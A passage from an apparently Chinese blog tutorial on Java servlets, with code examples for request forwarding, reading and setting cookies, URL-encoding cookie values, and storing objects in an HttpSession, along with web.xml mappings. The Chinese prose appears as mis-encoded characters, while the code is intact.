System.out.println(Arrays.toString(hobbys));</span><br><span class="line">        System.out.println(<span class="string">&quot;=============================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(req.getContextPath());</span><br><span class="line">        <span class="comment">// é€šè¿‡è¯·æ±‚è½¬å‘</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œçš„ / ä»£è¡¨å½“å‰çš„webåº”ç”¨</span></span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/success.jsp&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.HttpServletRequestTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hsrt<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€Cookie-Session"><a href="#äº”ã€Cookie-Session" class="headerlink" title="äº”ã€Cookie.Session"></a>äº”ã€Cookie.Session</h2><h3 id="1-ä¼šè¯"><a href="#1-ä¼šè¯" class="headerlink" title="1.ä¼šè¯"></a>1.ä¼šè¯</h3><ul>
<li><p><strong>ä¼šè¯</strong>ï¼šç”¨æˆ·æ‰“å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œç‚¹å‡»äº†å¾ˆå¤šè¶…é“¾æ¥ï¼Œè®¿é—®å¤šä¸ªwebèµ„æºï¼Œå…³é—­æµè§ˆå™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç§°ä¹‹ä¸ºä¼šè¯ï¼›</p>
</li>
<li><p><strong>æœ‰çŠ¶æ€ä¼šè¯</strong>ï¼šä¸€ä¸ªåŒå­¦æ¥è¿‡æ•™å®¤ï¼Œä¸‹æ¬¡å†æ¥æ•™å®¤ï¼Œæˆ‘ä»¬ä¼šçŸ¥é“è¿™ä¸ªåŒå­¦ï¼Œæ›¾ç»æ¥è¿‡ï¼Œç§°ä¹‹ä¸ºæœ‰çŠ¶æ€ä¼šè¯ï¼›</p>
</li>
</ul>
<blockquote>
<p><strong>ä½ èƒ½æ€ä¹ˆè¯æ˜ä½ æ˜¯è¥¿å¼€çš„å­¦ç”Ÿï¼Ÿ</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ä½               è¥¿å¼€</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å‘ç¥¨                è¥¿å¼€ç»™ä½ å‘ç¥¨</span><br><span class="line"><span class="number">2.</span> å­¦æ ¡ç™»è®°        è¥¿å¼€æ ‡è®°ä½ æ¥è¿‡äº†</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>ä¸€ä¸ªç½‘ç«™ï¼Œæ€ä¹ˆè¯æ˜ä½ æ¥è¿‡ï¼Ÿ</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯              æœåŠ¡ç«¯</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> æœåŠ¡ç«¯ç»™å®¢æˆ·ç«¯ä¸€ä¸ª ä¿¡ä»¶ï¼Œå®¢æˆ·ç«¯ä¸‹æ¬¡è®¿é—®æœåŠ¡ç«¯å¸¦ä¸Šä¿¡ä»¶å°±å¯ä»¥äº†ï¼› cookie</span><br><span class="line"><span class="number">2.</span> æœåŠ¡å™¨ç™»è®°ä½ æ¥è¿‡äº†ï¼Œä¸‹æ¬¡ä½ æ¥çš„æ—¶å€™æˆ‘æ¥åŒ¹é…ä½ ï¼› seesion</span><br></pre></td></tr></table></figure>

<h3 id="2-ä¿å­˜ä¼šè¯çš„ä¸¤ç§æŠ€æœ¯"><a href="#2-ä¿å­˜ä¼šè¯çš„ä¸¤ç§æŠ€æœ¯" class="headerlink" title="2.ä¿å­˜ä¼šè¯çš„ä¸¤ç§æŠ€æœ¯"></a>2.ä¿å­˜ä¼šè¯çš„ä¸¤ç§æŠ€æœ¯</h3><p><strong>cookie</strong></p>
<ul>
<li>å®¢æˆ·ç«¯æŠ€æœ¯   ï¼ˆå“åº”ï¼Œè¯·æ±‚ï¼‰</li>
</ul>
<p><strong>session</strong></p>
<ul>
<li>æœåŠ¡å™¨æŠ€æœ¯ï¼Œåˆ©ç”¨è¿™ä¸ªæŠ€æœ¯ï¼Œå¯ä»¥ä¿å­˜ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Ÿ æˆ‘ä»¬å¯ä»¥æŠŠä¿¡æ¯æˆ–è€…æ•°æ®æ”¾åœ¨Sessionä¸­ï¼</li>
</ul>
<blockquote>
<p>å¸¸è§å¸¸è§ï¼šç½‘ç«™ç™»å½•ä¹‹åï¼Œä½ ä¸‹æ¬¡ä¸ç”¨å†ç™»å½•äº†ï¼Œç¬¬äºŒæ¬¡è®¿é—®ç›´æ¥å°±ä¸Šå»äº†ï¼</p>
</blockquote>
<h3 id="3-Cookie"><a href="#3-Cookie" class="headerlink" title="3.Cookie"></a>3.Cookie</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/d78787f1dfed6242460ba721e2f81bb0--50d1--image-20241020175154351.png" alt="image-20241020175154351"></p>
<ol>
<li>ä»è¯·æ±‚ä¸­æ‹¿åˆ°cookieä¿¡æ¯ï¼›</li>
<li>æœåŠ¡å™¨å“åº”ç»™å®¢æˆ·ç«¯cookieï¼›</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies = req.getCookies(); <span class="comment">// è·å¾—Cookie</span></span><br><span class="line">cookie.getName(); <span class="comment">// è·å¾—cookieä¸­çš„key</span></span><br><span class="line">cookie.getValue(); <span class="comment">// è·å¾—cookieä¸­çš„vlaue</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;lastLoginTime&quot;</span>, System.currentTimeMillis()+<span class="string">&quot;&quot;</span>); <span class="comment">// æ–°å»ºä¸€ä¸ªcookie</span></span><br><span class="line">cookie.setMaxAge(<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); <span class="comment">// è®¾ç½®cookieçš„æœ‰æ•ˆæœŸ</span></span><br><span class="line">resp.addCookie(cookie); <span class="comment">// å“åº”ç»™å®¢æˆ·ç«¯ä¸€ä¸ªcookie</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cookieï¼šä¸€èˆ¬ä¼šä¿å­˜åœ¨æœ¬åœ°çš„ ç”¨æˆ·ç›®å½•ä¸‹ appdataï¼›</strong></li>
<li>æ¡ˆä¾‹ï¼š</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¿å­˜ç”¨æˆ·ä¸Šä¸€æ¬¡è®¿é—®çš„æ—¶é—´</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieDemo01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// æœåŠ¡å™¨ï¼Œå‘Šè¯‰ä½ ï¼Œä½ æ¥çš„æ—¶é—´ï¼Œå°†è¿™ä¸ªæ—¶é—´å°è£…ä¸ºä¸€ä¸ªä¿¡ä»¶</span></span><br><span class="line">        <span class="comment">// è§£å†³ä¸­æ–‡ä¹±ç </span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cookie,æœåŠ¡ç«¯ä»å®¢æˆ·ç«¯è·å–</span></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="comment">// è¿™é‡Œè¿”å›æ•°ç»„ï¼Œè¯´æ˜Cookieå¯èƒ½å­˜åœ¨å¤šä¸ª</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­Cookieæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span>(cookies!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨ï¼Œéå†æ•°ç»„</span></span><br><span class="line">            writer.write(<span class="string">&quot;ä½ ä¸Šä¸€æ¬¡è®¿é—®çš„æ—¶é—´æ˜¯:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">                <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> cookies[i];</span><br><span class="line">                <span class="comment">// è·å–Cookieçš„åå­—</span></span><br><span class="line">                <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;lastLoginTime&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è·å¾—cookieä¸­çš„value</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">parseLong</span> <span class="operator">=</span> Long.parseLong(cookie.getValue());</span><br><span class="line">                    <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(parseLong);</span><br><span class="line">                    writer.write(date.toLocaleString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;ç¬¬ä¸€æ¬¡è®¿é—®æœ¬ç«™ï¼ï¼ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœåŠ¡ç«¯ç»™å®¢æˆ·ç«¯å“åº”ä¸€ä¸ªCookie;</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;lastLoginTime&quot;</span>, System.currentTimeMillis()+<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo01<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.CookieDemo01<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo01<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cd01<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸€ä¸ªç½‘ç«™cookieæ˜¯å¦å­˜åœ¨ä¸Šé™ï¼<strong>èŠèŠç»†èŠ‚é—®é¢˜</strong>ã€‚</p>
</blockquote>
<ul>
<li>ä¸€ä¸ªCookieåªèƒ½ä¿å­˜ä¸€ä¸ªä¿¡æ¯ï¼›</li>
<li>ä¸€ä¸ªwebç«™ç‚¹å¯ä»¥ç»™æµè§ˆå™¨å‘é€å¤šä¸ªcookieï¼Œæœ€å¤šå­˜æ”¾20ä¸ªcookieï¼›</li>
<li>Cookieå¤§å°æœ‰é™åˆ¶4kbï¼›</li>
<li>300ä¸ªcookieæµè§ˆå™¨ä¸Šé™ã€‚</li>
</ul>
<blockquote>
<p><strong>åˆ é™¤Cookieï¼›</strong></p>
</blockquote>
<ul>
<li>ä¸è®¾ç½®æœ‰æ•ˆæœŸï¼Œå…³é—­æµè§ˆå™¨ï¼Œè‡ªåŠ¨å¤±æ•ˆï¼›</li>
<li>è®¾ç½®æœ‰æ•ˆæœŸæ—¶é—´ä¸º 0 ï¼›</li>
</ul>
<blockquote>
<p><strong>ç¼–ç è§£ç ï¼š</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URLEncoder.encode(<span class="string">&quot;å“‡å“ˆå“ˆ&quot;</span>,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">URLDecoder.decode(cookie.getValue(),<span class="string">&quot;UTF-8&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸­æ–‡æ•°æ®ä¼ é€’</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieDemo03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// è§£å†³ä¸­æ–‡ä¹±ç </span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­Cookieæ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span>(cookies!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨ï¼Œéå†æ•°ç»„</span></span><br><span class="line">            writer.write(<span class="string">&quot;ä½ ä¸Šä¸€æ¬¡è®¿é—®çš„ç”¨æˆ·æ˜¯:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">                <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> cookies[i];</span><br><span class="line">                <span class="comment">// è·å–Cookieçš„åå­—</span></span><br><span class="line">                <span class="keyword">if</span>(cookie.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è§£ç </span></span><br><span class="line">                    writer.write(URLDecoder.decode(cookie.getValue(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;ç¬¬ä¸€æ¬¡è®¿é—®æœ¬ç«™ï¼ï¼ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¼–ç </span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;name&quot;</span>, URLEncoder.encode(<span class="string">&quot;å“‡å“ˆå“ˆ&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo03<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.CookieDemo03<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo03<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cd03<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-Session-é‡ç‚¹"><a href="#4-Session-é‡ç‚¹" class="headerlink" title="4.Session(é‡ç‚¹)"></a>4.Session(é‡ç‚¹)</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/5dd1ae688ff16a9607041d3db814f56b--97f0--image-20241020180613637.png" alt="image-20241020180613637"></p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯Sessionï¼š</p>
</blockquote>
<ul>
<li>æœåŠ¡å™¨ä¼šç»™æ¯ä¸€ä¸ªç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰åˆ›å»ºä¸€ä¸ªSeesionå¯¹è±¡ï¼›</li>
<li>ä¸€ä¸ªSeesionç‹¬å ä¸€ä¸ªæµè§ˆå™¨ï¼Œåªè¦æµè§ˆå™¨æ²¡æœ‰å…³é—­ï¼Œè¿™ä¸ªSessionå°±å­˜åœ¨ï¼›</li>
<li>ç”¨æˆ·ç™»å½•ä¹‹åï¼Œæ•´ä¸ªç½‘ç«™å®ƒéƒ½å¯ä»¥è®¿é—®ï¼â€“&gt; ä¿å­˜ç”¨æˆ·çš„ä¿¡æ¯ï¼›ä¿å­˜è´­ç‰©è½¦çš„ä¿¡æ¯â€¦..</li>
</ul>
<blockquote>
<p>Sessionå’Œcookieçš„åŒºåˆ«ï¼š</p>
</blockquote>
<ul>
<li>Cookieæ˜¯æŠŠç”¨æˆ·çš„æ•°æ®å†™ç»™ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨ä¿å­˜ ï¼ˆå¯ä»¥ä¿å­˜å¤šä¸ªï¼‰</li>
<li>SessionæŠŠç”¨æˆ·çš„æ•°æ®å†™åˆ°ç”¨æˆ·ç‹¬å Sessionä¸­ï¼ŒæœåŠ¡å™¨ç«¯ä¿å­˜  ï¼ˆä¿å­˜é‡è¦çš„ä¿¡æ¯ï¼Œå‡å°‘æœåŠ¡å™¨èµ„æºçš„æµªè´¹ï¼‰</li>
<li>Sessionå¯¹è±¡ç”±æœåŠ¡åˆ›å»ºï¼›</li>
</ul>
<blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼š</p>
</blockquote>
<ul>
<li>ä¿å­˜ä¸€ä¸ªç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼›</li>
<li>è´­ç‰©è½¦ä¿¡æ¯ï¼›</li>
<li>åœ¨æ•´ä¸ªç½‘ç«™ä¸­ç»å¸¸ä¼šä½¿ç”¨çš„æ•°æ®ï¼Œæˆ‘ä»¬å°†å®ƒä¿å­˜åœ¨Sessionä¸­ï¼›</li>
</ul>
<blockquote>
<p>ä½¿ç”¨Sessionï¼š</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.pojo.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionDemo01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// è§£å†³ä¹±ç é—®é¢˜</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¾—åˆ°Session</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// åœ¨sessionä¸­å­˜ä¸œè¥¿</span></span><br><span class="line">        session.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;æ‡’ç¾Šç¾Š&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// è·å–Sessionä¸­çš„ID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> session.getId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­Sessionæ˜¯å¦ä¸ºæ–°åˆ›å»ºçš„</span></span><br><span class="line">        <span class="keyword">if</span>(session.isNew())&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;sessionåˆ›å»ºæˆåŠŸï¼ID:&quot;</span> + id);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;sessionå·²ç»åœ¨æœåŠ¡å™¨ä¸­å­˜åœ¨äº†ï¼ID:&quot;</span> + id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sessionåˆ›å»ºçš„æ—¶å€™åšäº†ä»€ä¹ˆäº‹æƒ…:</span></span><br><span class="line"><span class="comment">//        Cookie cookie = new Cookie(&quot;JSESSIONID&quot;, id);</span></span><br><span class="line"><span class="comment">//        resp.addCookie(cookie);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//// å¾—åˆ°Session</span></span><br><span class="line"><span class="comment">//HttpSession session = req.getSession();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Person person = (Person) session.getAttribute(&quot;name&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//System.out.println(person.toString());</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//HttpSession session = req.getSession();</span></span><br><span class="line"><span class="comment">//session.removeAttribute(&quot;name&quot;);</span></span><br><span class="line"><span class="comment">//// æ‰‹åŠ¨æ³¨é”€Session</span></span><br><span 